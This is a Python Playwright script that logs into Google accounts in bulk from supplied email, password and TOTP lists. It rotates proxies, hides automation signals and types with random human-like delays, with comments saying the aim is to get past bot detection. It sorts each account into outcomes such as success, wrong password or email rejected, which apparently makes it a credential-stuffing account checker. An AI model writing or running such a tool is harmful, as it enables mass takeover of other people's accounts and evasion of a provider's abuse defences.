import asyncio
import random
import time
import os
import pyotp
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# FIXED FINGERPRINT: Consistency is key to bypassing "bot" detection
FIXED_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
FIXED_TIMEZONE = "America/New_York"
FIXED_VIEWPORT = {"width": 1920, "height": 1080}

PROXY_POOL = []

class GmailVerificationEngine:
    def __init__(self, headless=True, debug_dir="debug_screenshots"):
        self.headless = headless
        self.p = None
        self.browser = None
        self.debug_dir = debug_dir
        os.makedirs(self.debug_dir, exist_ok=True)

    def _get_proxy(self):
        if PROXY_POOL:
            proxy_url = random.choice(PROXY_POOL)
            return {"server": proxy_url}
        return None

    async def start(self):
        self.p = await async_playwright().start()
        args = [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-infobars",
            "--disable-dev-shm-usage"
        ]
        self.browser = await self.p.chromium.launch(
            headless=self.headless, 
            args=args
        )
        
    async def stop(self):
        if self.browser:
            await self.browser.close()
        if self.p:
            await self.p.stop()

    async def _type_human(self, page, selector, text):
        """
        Types text with human-like irregularity.
        Ensures the element is focused before typing.
        """
        try:
            element = page.locator(selector).first
            await element.wait_for(state="visible", timeout=5000)
            await element.click()
            # Explicitly focus to ensure keyboard input goes to the right place
            await element.focus()
            
            # Clear any pre-filled text
            await element.fill("")
            
            for char in text:
                # Realistic typing: 80-200ms per char
                await page.keyboard.type(char, delay=random.randint(80, 200))
                await asyncio.sleep(random.uniform(0.02, 0.1))
        except Exception as e:
            print(f"[_type_human] Error typing to {selector}: {e}")

    async def _click_next(self, page):
        """
        Robustly clicks the 'Next' or 'Submit' button.
        """
        selectors = [
            "button[data-messageid='identifier-submit']",
            "button[aria-label='Next']",
            "button[type='submit']",
            "input[type='submit']"
        ]
        
        for selector in selectors:
            try:
                btn = page.locator(selector).first
                # Check if visible and enabled
                if await btn.is_visible(timeout=2000):
                    await btn.click()
                    return True
            except Exception:
                continue
        
        # Fallback: Press Enter
        try:
            await page.keyboard.press("Enter")
            return True
        except Exception:
            return False

    async def _save_debug_screenshot(self, page, email, status):
        try:
            safe_email = email.replace("@", "_at_").replace(".", "_").replace("-", "_")
            filename = f"{self.debug_dir}/{safe_email}_{status}_{int(time.time())}.png"
            await page.screenshot(path=filename, full_page=True)
            print(f"[DEBUG] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[DEBUG] Failed to save screenshot: {e}")

    async def verify_account(self, cred):
        email = cred["email"]
        password = cred["password"]
        totp_secret = cred.get("totp_secret")
        
        result = {
            "email": email,
            "status": "PENDING",
            "error_message": None,
            "proxy_ip": "LOCAL",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }

        proxy_config = self._get_proxy()

        context_options = {
            "user_agent": FIXED_USER_AGENT,
            "viewport": FIXED_VIEWPORT,
            "timezone_id": FIXED_TIMEZONE,
            "locale": "en-US",
            "java_script_enabled": True,
            "bypass_csp": True
        }
        
        if proxy_config:
            context_options["proxy"] = proxy_config
            result["proxy_ip"] = proxy_config["server"]

        context = await self.browser.new_context(**context_options)
        await context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en']
            });
        """)
        
        page = await context.new_page()
        
        try:
            # 1. WARM-UP
            await page.goto("https://www.google.com/webhp", timeout=30000)
            try:
                consent_btn = await page.wait_for_selector("button[aria-label='Accept all']", timeout=3000)
                if consent_btn:
                    await consent_btn.click()
                    await asyncio.sleep(1)
            except:
                pass
            await asyncio.sleep(random.uniform(3, 5))

            # 2. NAVIGATE TO LOGIN
            await page.goto("https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin", timeout=30000)
            
            # 3. WAIT FOR EMAIL FIELD
            try:
                await page.wait_for_selector('input[name="identifier"]', timeout=10000)
            except PlaywrightTimeoutError:
                result["status"] = "EMAIL_FIELD_NOT_FOUND"
                result["error_message"] = page.url
                await self._save_debug_screenshot(page, email, "EMAIL_FIELD_NOT_FOUND")
                return result

            # 4. ENTER EMAIL
            await self._type_human(page, 'input[name="identifier"]', email)
            
            # 5. CLICK NEXT
            success = await self._click_next(page)
            if not success:
                result["status"] = "NEXT_BUTTON_NOT_FOUND"
                result["error_message"] = "Could not find or click Next button"
                await self._save_debug_screenshot(page, email, "NEXT_BUTTON_NOT_FOUND")
                return result
                
            # 6. WAIT FOR SERVER VALIDATION
            await asyncio.sleep(random.uniform(3, 6))

            # 7. CHECK FOR EMAIL REJECTION vs VALID
            # Strategy: If password field appears, email is valid.
            # Increased timeout to 10s to handle slow DOM rendering.
            try:
                await page.wait_for_selector('input[name="Passwd"]', timeout=10000)
                email_validated = True 
            except PlaywrightTimeoutError:
                email_validated = False

            if not email_validated:
                alert_text = ""
                try:
                    alert_el = await page.locator("div[role='alert']").first
                    alert_text = await alert_el.inner_text()
                except:
                    pass

                page_content_lower = (await page.content()).lower()
                
                if "doesn't exist" in alert_text.lower() or "not found" in alert_text.lower() or "use another account" in page_content_lower:
                    result["status"] = "EMAIL_REJECTED"
                    result["error_message"] = f"Google rejected email: {alert_text[:100]}"
                    await self._save_debug_screenshot(page, email, "EMAIL_REJECTED")
                    return result
                
                result["status"] = "EMAIL_VALIDATION_STUCK"
                result["error_message"] = "Email entered but did not advance to password field"
                await self._save_debug_screenshot(page, email, "EMAIL_STUCK")
                return result

            # --- IF EMAIL IS VALID, PROCEED TO PASSWORD ---

            # 8. ENTER PASSWORD
            # Wait a bit more to ensure the field is fully interactive
            await asyncio.sleep(1)
            await self._type_human(page, 'input[name="Passwd"]', password)
            
            # CLICK NEXT
            success = await self._click_next(page)
            if not success:
                await page.keyboard.press("Enter")
                
            # 10. POST-PASSWORD PAUSE
            await asyncio.sleep(random.uniform(4, 7))
            
            # 11. HANDLE POST-PASSWORD STATES
            current_url = page.url
            
            if "mail.google.com" in current_url:
                result["status"] = "SUCCESS"
                return result

            if "challenge" in current_url or "2fa" in current_url:
                totp_input = page.locator("input[name='totp']")
                if await totp_input.count() > 0:
                    if totp_secret:
                        totp = pyotp.TOTP(totp_secret).now()
                        await totp_input.fill(totp)
                        await self._click_next(page)
                        await asyncio.sleep(5)
                        if "mail.google.com" in page.url:
                            result["status"] = "SUCCESS_WITH_2FA"
                        else:
                            result["status"] = "2FA_FAILED"
                            result["error_message"] = page.url
                    else:
                        result["status"] = "2FA_REQUIRED_NO_SECRET"
                        result["error_message"] = "TOTP secret missing"
                else:
                    result["status"] = "CAPTCHA_OR_CHALLENGE"
                    result["error_message"] = current_url
                    await self._save_debug_screenshot(page, email, "CHALLENGE")
                return result

            if "accounts.google.com" in current_url:
                alert_text = ""
                try:
                    alert_el = await page.locator("div[role='alert']").first
                    alert_text = await alert_el.inner_text().lower()
                except:
                    pass

                if "incorrect" in alert_text or "wrong" in alert_text or "no longer works" in alert_text:
                    result["status"] = "INVALID_CREDENTIALS"
                    result["error_message"] = f"Google explicitly reported wrong password: {alert_text[:100]}"
                    await self._save_debug_screenshot(page, email, "WRONG_PASS")
                else:
                    result["status"] = "UNKNOWN_STATE"
                    result["error_message"] = f"Stuck on signin page. URL: {current_url}"
                    await self._save_debug_screenshot(page, email, "UNKNOWN_STATE")
                return result

            result["status"] = "UNKNOWN_STATE"
            result["error_message"] = page.url
            await self._save_debug_screenshot(page, email, "UNKNOWN_STATE")

        except Exception as e:
            result["status"] = "ERROR"
            result["error_message"] = str(e)
            try:
                await self._save_debug_screenshot(page, email, "EXCEPTION")
            except:
                pass
        finally:
            await context.close()
            
        return result

    async def run_batch(self, credentials, concurrency=3):
        results = []
        semaphore = asyncio.Semaphore(concurrency)
        
        async def worker(cred):
            async with semaphore:
                print(f"[START] Verifying {cred['email']}")
                res = await self.verify_account(cred)
                print(f"[DONE] {cred['email']}: {res['status']} - {res['error_message']}")
                results.append(res)
                
        tasks = [worker(cred) for cred in credentials]
        await asyncio.gather(*tasks)
        return results